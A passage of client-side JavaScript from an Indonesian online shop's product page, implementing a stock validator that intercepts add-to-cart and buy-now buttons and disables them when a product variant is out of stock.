                                window.showToast({
                                    type: 'success',
                                    title: 'Berhasil ditambahkan ke Keranjang',
                                    message: `<strong>${escapeHtml(productName)}</strong>${variantText ? ` Ã‚Â· <em>${escapeHtml(variantText)}</em>` : ''}<br>SKU: ${escapeHtml(skuText)} Ã‚Â· Qty: ${qty}`,
                                    duration: 5000,
                                    actions: [
                                        { 
                                            label: 'Lihat Keranjang', 
                                            onClick: () => { window.location.href = '/keranjang'; }
                                        },
                                        { 
                                            label: 'Lanjut Belanja', 
                                            variant: 'alt', 
                                            onClick: () => {} 
                                        }
                                    ]
                                });
                            } else {
                            }
                        }, 100); // Small delay to ensure cart operation completes first
                        
                    } else if (action === 'buy') {
                        // For mobile buy, call buyNow
                        if (typeof window.buyNow === 'function') {
                            window.buyNow();
                        }
                    }
                } else {
                    // Stock validation FAILED - absolutely NO cart function calls allowed
                    
                    // DO NOT CALL ANY CART FUNCTIONS - only show modal (already handled by validateBeforeCart)
                }
                
                // Always restore functions after validation (success or failure)
                setTimeout(() => {
                    // Remove blocking flag
                    if (window.addToCart && typeof window.addToCart === 'function') {
                        window.addToCart._stockValidatorBlocked = false;
                    }
                    
                    // Restore other functions
                    if (originalAddToCartSubmit && typeof originalAddToCartSubmit === 'function') {
                        window.addToCartSubmit = originalAddToCartSubmit;
                    }
                    if (originalPdAddToCartSubmit && typeof originalPdAddToCartSubmit === 'function') {
                        window._pdAddToCartSubmit = originalPdAddToCartSubmit;
                    }
                    
                }, 1000); // Shorter timeout since we want to restore quickly after success
            })
            .catch(error => {
                // On error, also block the action
            })
            .finally(() => {
                // Remove loading state
                button.classList.remove(config.loadingClass);
                button.disabled = originalDisabled;
                button.textContent = originalText;
            });

        return false;
    }

    /**
     * Intercept cart buttons
     */
    function interceptCartButtons() {

        
        // CRITICAL: Remove existing mobile cart handlers from product-detail.php
        setTimeout(() => {
            const mobileCartBtn = document.getElementById('mf-cart');
            if (mobileCartBtn) {
                // Clone the button to remove ALL existing event listeners
                const newBtn = mobileCartBtn.cloneNode(true);
                mobileCartBtn.parentNode.replaceChild(newBtn, mobileCartBtn);

                
                // Add our own handler to the new button
                newBtn.addEventListener('click', function(event) {
                    event.preventDefault();
                    event.stopPropagation();
                    event.stopImmediatePropagation();
                    handleMobileButtonClick(event, 'cart');
                    return false;
                }, true);
            }
        }, 50);
        
        // Note: Add to cart buttons are now handled via form submission override (addToCartSubmit)
        // This provides better integration with existing pd-addtocart.js toast system

        // Buy now buttons - updated selectors (desktop + mobile)
        addEventListener(document, 'click', function(event) {
            const target = event.target;
            
            // Desktop buy buttons
            if (target.classList.contains('btn-buy') ||           // Product detail buy button
                target.classList.contains('btn-buy-now') || 
                target.classList.contains('buy-now-btn') || 
                target.id === 'btn-buy' ||                        // Specific ID match
                getDataAttribute(target, 'action') === 'buy-now' ||
                getDataAttribute(target, 'action') === 'buy') {
                
                handleButtonClick(event, 'buy');
            }
            
            // Mobile buy buttons
            else if (target.classList.contains('mf-buy') ||       // Mobile fab buy button
                     target.id === 'mf-buy') {                   // Mobile buy button ID
                
                handleMobileButtonClick(event, 'buy');
            }
            
            // Mobile cart buttons - ENHANCED BLOCKING
            else if (target.classList.contains('mf-cart') ||      // Mobile fab cart button
                     target.id === 'mf-cart') {                  // Mobile cart button ID
                
                
                // Immediately prevent all event propagation
                event.preventDefault();
                event.stopPropagation();
                event.stopImmediatePropagation();
                
                handleMobileButtonClick(event, 'cart');
                
                // Return false to ensure no other handlers run
                return false;
            }
        }, true); // Use capturing phase to ensure we intercept before other handlers
        
        // Additional protection: Override addToCart function to add mobile button state checking
        const originalAddToCart = typeof window.addToCart === 'function' ? window.addToCart : null;
        if (originalAddToCart) {
            window.addToCart = async function(...args) {
                // Check if this call is coming from a mobile button that's currently being validated
                const mobileCartBtn = document.getElementById('mf-cart');
                if (mobileCartBtn && mobileCartBtn.classList.contains('loading-stock')) {
                    return Promise.reject(new Error('Mobile validation in progress - cart action blocked'));
                }
                
                // Check if functions are temporarily blocked (during stock failure)
                if (window.addToCart._stockValidatorBlocked) {
                    return Promise.reject(new Error('Stock validation failed - cart action blocked'));
                }
                
                // Allow normal calls
                return originalAddToCart.apply(this, args);
            };
            
            // Store reference to original for restoration
            window.addToCart._original = originalAddToCart;
        }
    }

    /**
     * Setup global click interceptor for security
     * This catches ALL clicks on cart/buy buttons and validates stock BEFORE any other handler
     */
    function setupGlobalClickInterceptor() {
        // Add capture-phase listener to catch clicks before other handlers
        document.addEventListener('click', function(event) {
            const target = event.target;
            
            // Check if this is a cart/buy button
            const isCartButton = target.matches('.btn-add-cart, .mf-cart, #mf-cart, #btn-add-cart') ||
                                target.closest('.btn-add-cart, .mf-cart, #mf-cart, #btn-add-cart');
            const isBuyButton = target.matches('.btn-buy-now, .mf-buy, #mf-buy, #btn-buy') ||
                               target.closest('.btn-buy-now, .mf-buy, #mf-buy, #btn-buy');
                               
            if (!isCartButton && !isBuyButton) {
                return; // Not our target, allow normal processing
            }
            
            const button = isCartButton ? 
                (target.matches('.btn-add-cart, .mf-cart, #mf-cart, #btn-add-cart') ? target : target.closest('.btn-add-cart, .mf-cart, #mf-cart, #btn-add-cart')) :
                (target.matches('.btn-buy-now, .mf-buy, #mf-buy, #btn-buy') ? target : target.closest('.btn-buy-now, .mf-buy, #mf-buy, #btn-buy'));
            
            // IMMEDIATE BLOCK: Prevent any processing first
            event.preventDefault();
            event.stopImmediatePropagation();
            
            // SECURITY CHECK 1: Is button marked as stock-blocked?
            if (button && button.hasAttribute('data-stock-blocked')) {
                
                const reason = button.getAttribute('data-stock-reason') || 'Stok tidak tersedia';
                showStockModal(reason);
                
                // Show security alert
                if (window.showToast) {
                    window.showToast({
                        type: 'error',
                        title: 'Aksi Diblokir',
                        message: 'Produk ini sedang habis stok dan tidak dapat ditambahkan ke keranjang.',
                        duration: 4000
                    });
                }
                
                return false;
            }
            
            // SECURITY CHECK 2: Real-time validation against cached stock info
            if (window._currentStockInfo && !window._currentStockInfo.can_add_to_cart) {
                
                showStockModal(window._currentStockInfo.message || 'Stok tidak tersedia');
                
                // Re-enforce button disabling
                if (button) {
                    button.disabled = true;
                    button.style.opacity = '0.5';
                    button.style.cursor = 'not-allowed';
                    button.setAttribute('data-stock-blocked', 'true');
                    button.setAttribute('data-stock-reason', window._currentStockInfo.message || 'Stok tidak tersedia');
                }
                
                return false;
            }
            
            // SECURITY CHECK 3: Smart client-side validation
            const productId = window.PD_ID ? parseInt(window.PD_ID) : 0;
            const variantSelector = document.getElementById('pd-variant-id');
            const variantId = variantSelector ? parseInt(variantSelector.value || 0) : 0;
            
            if (productId > 0) {
                // SMART VALIDATION: If we already have cached stock info showing stock is available,
                // and buttons are enabled, proceed immediately without re-validation
                if (window._currentStockInfo && window._currentStockInfo.can_add_to_cart && 
                    button && !button.disabled && !button.hasAttribute('data-stock-blocked')) {
                    
                    // Allow the action to proceed immediately with toast
                    if (isCartButton) {
                        // Trigger cart action with proper toast handling
                        if (typeof window._pdAddToCartSubmit === 'function') {
                            // Use pd-addtocart.js function for proper toast handling
                            const form = document.getElementById('pd-buy-form') || button.closest('form');
                            if (form) {
                                const fakeEvent = { 
                                    target: form,
                                    preventDefault: () => {}
                                };
                                window._pdAddToCartSubmit(fakeEvent, productId);
                            }
                        } else if (typeof window.addToCartSubmit === 'function') {
                            // Fallback to addToCartSubmit
                            const form = document.getElementById('pd-buy-form') || button.closest('form');
                            if (form) {
                                const fakeEvent = { 
                                    target: form,
                                    preventDefault: () => {}
                                };
                                window.addToCartSubmit(fakeEvent, productId);
                            }
                        } else if (typeof window.addToCart === 'function') {
                            // Direct addToCart call
                            window.addToCart(productId, 1, variantId);
                        }
                    } else if (isBuyButton) {
                        // Trigger buy action
                        if (typeof window.buyNow === 'function') {
                            window.buyNow();
                        }
                    }
                    
                    return false; // Action completed
                }
                
                // Get stock info from embedded variant data (for variant products)
                const stockInfo = getStockFromEmbeddedData(variantId);
                
                if (stockInfo && stockInfo.hasStock) {
                    
                    // Update global stock cache
                    window._currentStockInfo = {
                        can_add_to_cart: true,
                        is_in_stock: true,
                        available_stock: stockInfo.stock,
                        message: 'Stok tersedia'
                    };
                    
                    // IMPORTANT: Check if button was explicitly blocked by variant logic (e.g., pre-order exhausted)
                    // If data-stock-blocked is set, respect it and don't enable the button
                    const isExplicitlyBlocked = button.getAttribute('data-stock-blocked') === 'true';
                    
                    if (!isExplicitlyBlocked) {
                        // Remove stock blocking if it was set and enable button
                        button.removeAttribute('data-stock-blocked');
                        button.removeAttribute('data-stock-reason');
                        button.disabled = false;
                        button.style.opacity = '';
                        button.style.cursor = '';
                        button.classList.remove(config.disabledClass);
                    } else {
                        // Button is blocked by variant logic, show reason
                        const reason = button.getAttribute('data-stock-reason') || 'Tidak tersedia';
                        console.log('Button blocked by variant logic:', reason);
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }
                    
                    // Allow the action to proceed immediately with toast
                    if (isCartButton) {
                        // Trigger cart action with proper toast handling
                        if (typeof window._pdAddToCartSubmit === 'function') {
                            // Use pd-addtocart.js function for proper toast handling
                            const form = document.getElementById('pd-buy-form') || button.closest('form');
                            if (form) {
                                const fakeEvent = { 
                                    target: form,
                                    preventDefault: () => {}
                                };
                                window._pdAddToCartSubmit(fakeEvent, productId);
                            }
                        } else if (typeof window.addToCartSubmit === 'function') {
                            // Fallback to addToCartSubmit
                            const form = document.getElementById('pd-buy-form') || button.closest('form');
                            if (form) {
                                const fakeEvent = { 
                                    target: form,
                                    preventDefault: () => {}
                                };
                                window.addToCartSubmit(fakeEvent, productId);
                            }
                        } else if (typeof window.addToCart === 'function') {
                            // Direct addToCart call
                            window.addToCart(productId, 1, variantId);
                        }
                    } else if (isBuyButton) {
                        // Trigger buy action
                        if (typeof window.buyNow === 'function') {
                            window.buyNow();
                        }
                    }
                } else if (stockInfo && !stockInfo.hasStock) {
                    
                    // Update global stock cache
                    window._currentStockInfo = {
                        can_add_to_cart: false,
                        is_in_stock: false,
                        available_stock: stockInfo.stock,
                        message: `Stok tidak tersedia${stockInfo.sku ? ` untuk ${stockInfo.sku}` : ''}`
                    };
                    
                    // Force block button
                    button.disabled = true;
                    button.style.opacity = '0.5';
                    button.style.cursor = 'not-allowed';
                    button.setAttribute('data-stock-blocked', 'true');
                    button.setAttribute('data-stock-reason', window._currentStockInfo.message);
                    
                    // Show modal with variant info
                    const modalMessage = stockInfo ? 
                        `Varian yang dipilih (${stockInfo.sku}) sedang habis stok. Silakan pilih varian lain.` :
                        'Produk ini sedang habis stok. Silakan pilih varian lain.';
                    
                    showStockModal(modalMessage);
                    
                    // Show security warning
                    if (window.showToast) {
                        window.showToast({
                            type: 'warning',
                            title: 'Stok Tidak Tersedia',
                            message: 'Varian yang dipilih sedang habis stok. Silakan pilih varian lain.',
                            duration: 3000
                        });
                    }
                } else {
                    // stockInfo is null (simple product) - this means embedded data is not available
                    // For simple products, if buttons are enabled, we should proceed (trust the API response from updateStockDisplay)
                    if (button && !button.disabled && !button.hasAttribute('data-stock-blocked')) {
                        
                        // Allow the action to proceed immediately with toast
                        if (isCartButton) {
                            // Trigger cart action with proper toast handling
                            if (typeof window._pdAddToCartSubmit === 'function') {
                                // Use pd-addtocart.js function for proper toast handling
                                const form = document.getElementById('pd-buy-form') || button.closest('form');
                                if (form) {
                                    const fakeEvent = { 
                                        target: form,
                                        preventDefault: () => {}
                                    };
                                    window._pdAddToCartSubmit(fakeEvent, productId);
                                }
                            } else if (typeof window.addToCartSubmit === 'function') {
                                // Fallback to addToCartSubmit
                                const form = document.getElementById('pd-buy-form') || button.closest('form');
                                if (form) {
                                    const fakeEvent = { 
                                        target: form,
                                        preventDefault: () => {}
                                    };
                                    window.addToCartSubmit(fakeEvent, productId);
                                }
                            } else if (typeof window.addToCart === 'function') {
                                // Direct addToCart call
                                window.addToCart(productId, 1, variantId);
                            }
                        } else if (isBuyButton) {
                            // Trigger buy action
                            if (typeof window.buyNow === 'function') {
                                window.buyNow();
                            }
                        }
                    } else {
                        // Button is disabled, don't allow action
                        showStockModal('Produk ini sedang tidak tersedia.');
                    }
                }
            } else {
                // No product ID, block action
                showStockModal('Data produk tidak valid.');
            }
            
            return false; // Always block at capture phase
            
        }, true); // Use capture phase to run BEFORE other listeners
        

    }

    /**
     * Initialize button data attributes from current page
     */
    function initializeButtonAttributes() {
        // Get product data from page globals or form
        let productId = 0, variantId = 0;
        
        // Try to get from global variables (set by PHP)
        if (window.PD_ID) productId = parseInt(window.PD_ID);
        
        // Try to get from form
        const form = document.getElementById('pd-buy-form');
        if (form) {
            const pidAttr = form.getAttribute('data-pid');
            if (pidAttr) productId = parseInt(pidAttr);
            
            const varInput = document.getElementById('pd-variant-id');
            if (varInput) variantId = parseInt(varInput.value || 0);
        }
        
        // Try to get from mobile FAB
        const mobileFab = document.getElementById('pd-mobile-fab');
        if (mobileFab && productId <= 0) {
            const pidAttr = getDataAttribute(mobileFab, 'pid');
            if (pidAttr) productId = parseInt(pidAttr);
        }
        
        // Set attributes on desktop buttons
        const desktopButtons = document.querySelectorAll('.btn-add-cart, .btn-buy-now, #btn-add-cart, #btn-buy, #btn-buy-voucher');
        desktopButtons.forEach(button => {
            if (productId > 0) {
                button.setAttribute('data-product-id', productId);
                if (variantId > 0) {
                    button.setAttribute('data-variant-id', variantId);
                }
            }
        });
        
        // Set attributes on mobile buttons
        const mobileButtons = document.querySelectorAll('.mf-cart, .mf-buy, #mf-cart, #mf-buy');
        mobileButtons.forEach(button => {
            if (productId > 0) {
                button.setAttribute('data-product-id', productId);
                if (variantId > 0) {
                    button.setAttribute('data-variant-id', variantId);
                }
            }
        });
        

        
        // Initial stock display update on page load
        if (productId > 0) {
            setTimeout(() => {
                updateStockDisplay(productId, variantId);

            }, 100);
        }
    }

    /**
     * Update button attributes when variant changes
     */
    function updateButtonAttributesForVariant(variantId) {
        const productId = window.PD_ID ? parseInt(window.PD_ID) : 0;
        
        if (productId <= 0) return;
        
        // Update desktop buttons
        const desktopButtons = document.querySelectorAll('.btn-add-cart, .btn-buy-now, #btn-add-cart, #btn-buy, #btn-buy-voucher');
        desktopButtons.forEach(button => {
            button.setAttribute('data-product-id', productId);
            if (variantId > 0) {
                button.setAttribute('data-variant-id', variantId);
            } else {
                button.removeAttribute('data-variant-id');
            }
        });
        
        // Update mobile buttons
        const mobileButtons = document.querySelectorAll('.mf-cart, .mf-buy, #mf-cart, #mf-buy');
        mobileButtons.forEach(button => {
            button.setAttribute('data-product-id', productId);
            if (variantId > 0) {
                button.setAttribute('data-variant-id', variantId);
            } else {
                button.removeAttribute('data-variant-id');
            }
        });
        

    }

    /**
     * Setup variant change integration with existing product-detail.php handlers
     */
    function setupVariantChangeIntegration() {
        // Strategy: Hook into existing applyVariant function instead of adding new listener
        // This prevents conflicts with existing variant change functionality (gallery, pricing, etc.)
        
        // Method 1: Hook into existing applyVariant function
        setTimeout(() => {
            if (typeof window.applyVariant === 'function') {
                const originalApplyVariant = window.applyVariant;
                window.applyVariant = function(v, focusImage) {
                    // Call original function first
                    const result = originalApplyVariant.call(this, v, focusImage);
                    
                // Then add our stock validator logic
                const variantId = v ? (v.id || v.ID || 0) : 0;
                
                // Update button attributes for stock validator
                updateButtonAttributesForVariant(variantId);
                
                // Update stock display using embedded data (instant)
                const productId = window.PD_ID ? parseInt(window.PD_ID) : 0;
                if (productId > 0) {
                    updateStockDisplay(productId, variantId);
                }                    return result;
                };
                

            } else {

                setupVariantObserver();
            }
        }, 500);
        
        // Method 2: Direct observation of hidden input value changes (fallback)
        setTimeout(() => {
            setupVariantObserver();
        }, 1000);
    }

    /**
     * Setup variant observer as fallback when applyVariant hook fails
     */
    function setupVariantObserver() {
        const variantInput = document.getElementById('pd-variant-id');
        if (variantInput) {
            let lastVariantId = parseInt(variantInput.value || '0');
            
            // Use MutationObserver to watch for value changes
            if (window.MutationObserver) {
                const observer = new MutationObserver((mutations) => {
                    mutations.forEach((mutation) => {
                        if (mutation.type === 'attributes' && mutation.attributeName === 'value') {
                            const newVariantId = parseInt(variantInput.value || '0');
                            if (newVariantId !== lastVariantId) {
                    
                                updateButtonAttributesForVariant(newVariantId);
                                
                                // Update stock display with embedded data
                                const productId = window.PD_ID ? parseInt(window.PD_ID) : 0;
                                if (productId > 0) {
                                    updateStockDisplay(productId, newVariantId);
                                }
                                
                                lastVariantId = newVariantId;
                            }
                        }
                    });
                });
                
                observer.observe(variantInput, { 
                    attributes: true, 
                    attributeFilter: ['value'] 
                });
                

            }
            
            // Additional polling as ultimate fallback
            setInterval(() => {
                const currentVariantId = parseInt(variantInput.value || '0');
                if (currentVariantId !== lastVariantId) {
        
                    updateButtonAttributesForVariant(currentVariantId);
                    
                    // Update stock display with embedded data
                    const productId = window.PD_ID ? parseInt(window.PD_ID) : 0;
                    if (productId > 0) {
                        updateStockDisplay(productId, currentVariantId);
                    }
                    
                    lastVariantId = currentVariantId;
                }
            }, 1000);
            

        }
    }

    /**
     * Update stock display and enforce stock-based button blocking using embedded data
     */
    function updateStockDisplay(productId, variantId = 0) {

        
        // Get stock info from embedded data (instant)
        const embeddedStockInfo = getStockFromEmbeddedData(variantId);
        
        let stockInfo;
        if (embeddedStockInfo) {
            // Convert embedded data to standard format
            stockInfo = {
                can_add_to_cart: embeddedStockInfo.hasStock,
                is_in_stock: embeddedStockInfo.hasStock,
                available_stock: embeddedStockInfo.stock,
                message: embeddedStockInfo.hasStock ? 'Stok tersedia' : `Stok habis${embeddedStockInfo.sku ? ` untuk ${embeddedStockInfo.sku}` : ''}`,
                product_name: window.PD_NAME || 'Produk',
                sku: embeddedStockInfo.sku
            };
            

        } else {
            // Fallback to API call if embedded data not available

            checkStock(productId, variantId, 1)
                .then(apiStockInfo => {
                    updateStockDisplayWithInfo(apiStockInfo, productId, variantId);
                })
                .catch(error => {
                    console.error('Failed to update stock display via API:', error);
                });
            return;
        }
        
        updateStockDisplayWithInfo(stockInfo, productId, variantId);
    }

    /**
     * Update stock display with provided stock info
     */
    function updateStockDisplayWithInfo(stockInfo, productId, variantId) {
        // Store current stock status globally for blocking checks
        window._currentStockInfo = stockInfo;
        
        // Update stock indicators
        const stockIndicators = document.querySelectorAll('.stock-indicator');
        stockIndicators.forEach(indicator => {
            if (stockInfo.is_in_stock) {
                indicator.classList.add('in-stock');
                indicator.classList.remove('out-of-stock');
            } else {
                indicator.classList.add('out-of-stock');
                indicator.classList.remove('in-stock');
            }
        });
        
        // Update stock count
        const stockCounts = document.querySelectorAll('.stock-count');
        stockCounts.forEach(count => {
            count.textContent = stockInfo.available_stock || 0;
        });
        
        // CRITICAL: For digital products, DO NOT modify button states here
        // PHP already handles button disable/enable based on LICENSE_POOL count
        // Only physical products need JavaScript stock validation
        const isDigitalProduct = window.IS_DIGITAL === true || window.IS_DIGITAL === 'true';
        
        if (isDigitalProduct) {
            // For digital products: ONLY update global stock info, don't touch buttons
            // Let PHP-rendered disabled state remain authoritative
            console.log('[Stock Validator] Digital product detected - skipping button state modification');
            return; // Exit early, preserve PHP-set button states
        }
        
        // ENHANCED: Force disable buttons for out-of-stock with anti-tampering (PHYSICAL PRODUCTS ONLY)
        const allButtons = document.querySelectorAll('.btn-add-cart, .btn-buy-now, .mf-cart, .mf-buy, #btn-add-cart, #btn-buy, #btn-buy-voucher, #mf-cart, #mf-buy');
        allButtons.forEach(button => {
            if (stockInfo.can_add_to_cart) {
                // STOCK AVAILABLE - ENABLE BUTTONS
                button.classList.remove(config.disabledClass);
                button.disabled = false;
                button.style.opacity = '';
                button.style.cursor = '';
                
                // CRITICAL: Remove stock blocking attributes when stock becomes available
                button.removeAttribute('data-stock-blocked');
                button.removeAttribute('data-stock-reason');
                

            } else {
                // OUT OF STOCK - FORCE DISABLE WITH ANTI-TAMPERING
                button.classList.add(config.disabledClass);
                button.disabled = true;
                button.style.opacity = '0.5';
                button.style.cursor = 'not-allowed';
                
                // Mark as stock-blocked to prevent re-enabling
                button.setAttribute('data-stock-blocked', 'true');
                button.setAttribute('data-stock-reason', stockInfo.message || 'Stok tidak tersedia');
                

            }
        });
        
        // Start aggressive button monitoring for out-of-stock variants
        if (!stockInfo.can_add_to_cart) {
            enforceStockDisabling(productId, variantId);
        }
        

    }

    /**
     * Aggressively enforce button disabling for out-of-stock items
     * CRITICAL: For digital products, DO NOT modify button states (PHP is authoritative)
     */
    function enforceStockDisabling(productId, variantId) {
        // CRITICAL: Skip enforcement for digital products - PHP handles button states
        const isDigitalProduct = window.IS_DIGITAL === true || window.IS_DIGITAL === 'true';
        if (isDigitalProduct) {
            console.log('[Stock Validator] Digital product - skipping button enforcement');
            return; // Exit early, let PHP-rendered disabled state remain
        }
        
        const monitorInterval = setInterval(() => {
            // Check if variant changed
            const currentVariantSelector = document.getElementById('pd-variant-id');
            const currentVariantId = currentVariantSelector ? parseInt(currentVariantSelector.value || 0) : 0;
            
            if (currentVariantId !== variantId) {
                // Variant changed, stop monitoring this variant
                clearInterval(monitorInterval);

                return;
            }
            
            // Check current stock status using embedded data (real-time check)
            const currentStockInfo = getStockFromEmbeddedData(currentVariantId);
            
            if (currentStockInfo && !currentStockInfo.hasStock) {
                // Still out of stock - continue monitoring for tampering
                const buttons = document.querySelectorAll('.btn-add-cart, .btn-buy-now, .mf-cart, .mf-buy, #btn-add-cart, #btn-buy, #btn-buy-voucher, #mf-cart, #mf-buy');
                buttons.forEach(button => {
                    // Check if button was manually enabled (inspect attack)
                    if (!button.disabled || button.style.opacity !== '0.5') {
                        
                        // Force re-disable
                        button.disabled = true;
                        button.style.opacity = '0.5';
                        button.style.cursor = 'not-allowed';
                        button.setAttribute('data-stock-blocked', 'true');
                        button.setAttribute('data-stock-reason', `Stok tidak tersedia${currentStockInfo.sku ? ` untuk ${currentStockInfo.sku}` : ''}`);
                        
                        // Show warning toast
                        if (window.showToast) {
                            window.showToast({
                                type: 'warning',
                                title: 'Aksi Tidak Diizinkan',
                                message: 'Produk ini sedang habis stok. Silakan pilih varian lain.',
                                duration: 3000
                            });
                        }
                    }
                });
            } else {
                // Stock available OR embedded data shows stock - stop monitoring
                clearInterval(monitorInterval);

                // For PHYSICAL products only, enable buttons
                // For DIGITAL products, skip (PHP is authoritative)
                const isDigitalProduct = window.IS_DIGITAL === true || window.IS_DIGITAL === 'true';
                
                if (!isDigitalProduct && currentStockInfo && currentStockInfo.hasStock) {
                    const buttons = document.querySelectorAll('.btn-add-cart, .btn-buy-now, .mf-cart, .mf-buy, #btn-add-cart, #btn-buy, #btn-buy-voucher, #mf-cart, #mf-buy');
                    buttons.forEach(button => {
                        button.disabled = false;
                        button.style.opacity = '';
                        button.style.cursor = '';
                        button.removeAttribute('data-stock-blocked');
                        button.removeAttribute('data-stock-reason');
                        button.classList.remove(config.disabledClass);
                    });

                }
            }
        }, 500); // Check every 500ms for tampering attempts
        
        // Auto-stop monitoring after 30 seconds to prevent memory leaks
        setTimeout(() => {
            clearInterval(monitorInterval);

        }, 30000);
    }

    /**
     * Override addToCartSubmit function to add stock validation
     * This function now works with pd-addtocart.js integration
     */
    function overrideAddToCartSubmitFunction() {
        // Check if pd-addtocart.js is already loaded
        const pdAddToCartExists = typeof window.addToCartSubmit === 'function' && 
                                  window.addToCartSubmit.toString().includes('showToast');
        
        if (pdAddToCartExists) {

            
            // Store the pd-addtocart.js function
            const pdAddToCartSubmit = window.addToCartSubmit;
            window._pdAddToCartSubmit = pdAddToCartSubmit;
            
            // Override with stock validation that calls pd-addtocart.js
            window.addToCartSubmit = async function(e, productId) {
                
                // Don't prevent default here - let pd-addtocart handle it if stock is valid
                
                try {
                    // Extract product data from form (same way as pd-addtocart.js)
                    const form = e.target;
                    const qty = parseInt(form.querySelector('[name=qty]')?.value || '1', 10) || 1;
                    
                    // CRITICAL: Always get current variant from selector (real-time)
                    let variantId = 0;
                    const variantSelector = document.getElementById('pd-variant-id');
                    if (variantSelector) {
                        variantId = parseInt(variantSelector.value || '0', 10) || 0;
                    }
                    
                    if (!productId || productId <= 0) {
                        return pdAddToCartSubmit(e, productId);
                    }


                    // Validate stock before proceeding
                    const isValid = await validateBeforeCart(productId, variantId, qty, 'cart');
                    
                    if (isValid) {
                        // Stock OK, call pd-addtocart.js function (it will handle toast)
                        return pdAddToCartSubmit(e, productId);
                    } else {
                        // Prevent the form submission
                        e.preventDefault();
                        // Stock validation failed, modal already shown by validateBeforeCart
                        return false;
                    }
                    
                } catch (error) {
                    e.preventDefault();
                    // On error, show modal and don't proceed
                    showStockModal({ 
                        message: 'Terjadi kesalahan saat memvalidasi stok. Silakan coba lagi.',
                        is_active: false 
                    }, 'cart');
                    return false;
                }
            };
        } else {
            // Original logic for when pd-addtocart.js is not present
            const originalAddToCartSubmit = typeof window.addToCartSubmit === 'function' ? window.addToCartSubmit : null;
            
            if (originalAddToCartSubmit) {
                window._originalAddToCartSubmit = originalAddToCartSubmit;
            }
            
            // Override with stock validation
            window.addToCartSubmit = async function(e, productId) {
                
                e.preventDefault();
                
                try {
                    const form = e.target;
                    const qty = parseInt(form.querySelector('[name=qty]')?.value || '1', 10) || 1;
                    
                    // CRITICAL: Always get current variant from selector (real-time)
                    let variantId = 0;
                    const variantSelector = document.getElementById('pd-variant-id');
                    if (variantSelector) {
                        variantId = parseInt(variantSelector.value || '0', 10) || 0;
                    }
                    
                    if (!productId || productId <= 0) {
                        if (originalAddToCartSubmit) return originalAddToCartSubmit(e, productId);
                        return false;
                    }


                    const isValid = await validateBeforeCart(productId, variantId, qty, 'cart');
                    
                    if (isValid) {
                        if (originalAddToCartSubmit) {
                            return originalAddToCartSubmit(e, productId);
                        } else {
                            if (typeof window.addToCart === 'function') {
                                await window.addToCart(productId, qty, variantId);
                            }
                        }
                    } else {
                    }
                    
                } catch (error) {
                    showStockModal({ 
                        message: 'Terjadi kesalahan saat memvalidasi stok. Silakan coba lagi.',
                        is_active: false 
                    }, 'cart');
                }
                
                return false;
            };
        }


    }

    /**
     * Override buyNow function to add stock validation
     */
    function overrideBuyNowFunction() {
        // Store original buyNow function if it exists
        const originalBuyNow = typeof window.buyNow === 'function' ? window.buyNow : null;
        
        // Override with stock validation
        window.buyNow = async function(e) {
            
            try {
                // Get product data (same way as pd-buynow.js)
                const form = document.getElementById('pd-buy-form');
                if (!form) {
                    if (originalBuyNow) return originalBuyNow(e);
                    return;
                }

                const productId = parseInt(form.dataset.pid || '0', 10);
                const qty = parseInt(form.querySelector('[name=qty]')?.value || '1', 10) || 1;
                
                // CRITICAL: Always get current variant from selector (real-time)
                let variantId = 0;
                const variantSelector = document.getElementById('pd-variant-id');
                if (variantSelector) {
                    variantId = parseInt(variantSelector.value || '0', 10) || 0;
                }
                
                if (!productId || productId <= 0) {
                    if (originalBuyNow) return originalBuyNow(e);
                    return;
                }


                // Validate stock before proceeding
                const isValid = await validateBeforeCart(productId, variantId, qty, 'buy');
                
                if (isValid) {
                    // Stock OK, call original buyNow function
                    if (originalBuyNow) {
                        return originalBuyNow(e);
                    } else {
                    }
                } else {
                    // Stock validation failed, modal already shown by validateBeforeCart
                }
                
            } catch (error) {
                // On error, show modal and don't proceed
                showStockModal({ 
                    message: 'Terjadi kesalahan saat memvalidasi stok. Silakan coba lagi.',
                    is_active: false 
                }, 'buy');
            }
        };


    }

    /**
     * Initialize stock validation
     */
    function init() {
        // Wait for DOM ready
        if (document.readyState === 'loading') {
            addEventListener(document, 'DOMContentLoaded', function() {
        initializeButtonAttributes();
        setupVariantChangeIntegration(); // Setup variant change integration
        interceptCartButtons();
        setupGlobalClickInterceptor(); // Setup global click security interceptor                // Override functions after other scripts load
                // Use multiple timeouts to catch late-loading scripts like pd-addtocart.js
                setTimeout(() => {
                    overrideAddToCartSubmitFunction();
                    overrideBuyNowFunction();
                }, 100);
                
                setTimeout(() => {
                    // Re-check and re-override if pd-addtocart.js loaded later
                    overrideAddToCartSubmitFunction();
                }, 500);
                
                setTimeout(() => {
                    // Final check for very late loading scripts
                    overrideAddToCartSubmitFunction();
                }, 1000);
                

            });
        } else {
            initializeButtonAttributes();
            setupVariantChangeIntegration(); // Setup variant change integration
            interceptCartButtons();
            setupGlobalClickInterceptor(); // Setup global click security interceptor
            
            // Override functions after other scripts load
            // Use multiple timeouts to catch late-loading scripts like pd-addtocart.js
            setTimeout(() => {
                overrideAddToCartSubmitFunction();
                overrideBuyNowFunction();
            }, 100);
            
            setTimeout(() => {
                // Re-check and re-override if pd-addtocart.js loaded later
                overrideAddToCartSubmitFunction();
            }, 500);
            
            setTimeout(() => {
                // Final check for very late loading scripts
                overrideAddToCartSubmitFunction();
            }, 1000);
            

        }
    }

    // Public API
    return {
        init: init,
        checkStock: checkStock,
        validateBeforeCart: validateBeforeCart,
        updateStockDisplay: updateStockDisplay,
        showStockModal: showStockModal,
        config: config
    };
})();

// Auto-initialize
if (typeof window !== 'undefined') {
    StockValidator.init();
}

</script>
<script data-inlined="pd-addtocart.js">
(function(){
  function esc(s){ return String(s||'').replace(/[&<>"']/g, m=>({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;' }[m])); }
  function getVariantSummaryText(){
    const vs = document.getElementById('pd-variant-summary');
    if (!vs) return '';
    const items = Array.from(vs.querySelectorAll('.vs-item strong')).map(el => el.textContent.trim()).filter(Boolean);
    return items.length ? items.join(' / ') : '';
  }
  window.addToCartSubmit = async function(e, productId){
    e.preventDefault();
    try {
      const form = e.target;
      const qty = parseInt(form.querySelector('[name=qty]')?.value || '1', 10) || 1;
      const variantId = parseInt(document.getElementById('pd-variant-id')?.value || '0', 10) || 0;
      await (window.addToCart ? window.addToCart(productId, qty, variantId) : Promise.reject(new Error('addToCart tidak tersedia')));

      if (window.PlazaAnalytics) {
